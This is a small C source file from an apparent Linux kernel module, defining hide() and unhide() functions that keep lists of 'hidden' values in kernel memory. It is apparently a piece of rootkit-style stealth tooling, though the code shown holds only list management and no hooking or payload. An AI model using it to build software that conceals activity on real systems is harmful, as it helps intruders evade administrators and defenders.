#include <linux/slab.h>

/* include */
#include "hidden_entity.h"

/* logic */
#include "hide.h"
#include "list_hidden.h"

void hide(const unsigned long value, const list_hidden_e list_hidden)
{
        hidden_t      *hidden    = NULL;
        list_hidden_t *list_head = (list_hidden_t *)list_hidden_get_head(list_hidden);

        hidden = kmalloc(sizeof(*hidden), GFP_KERNEL);
        if (hidden != NULL) {
                hidden->value = value;
                list_add(&hidden->list, list_head);
        }
}

void unhide(const unsigned long value, const list_hidden_e list_hidden)
{
        hidden_t      *hidden    = NULL;
        list_hidden_t *list_head = (list_hidden_t *)list_hidden_get_head(list_hidden);

        list_for_each_entry(hidden, list_head, list) {
                if (value == hidden->value) {
                        list_del(&hidden->list);
                        kfree(hidden);
                        return;
                }
        }

}

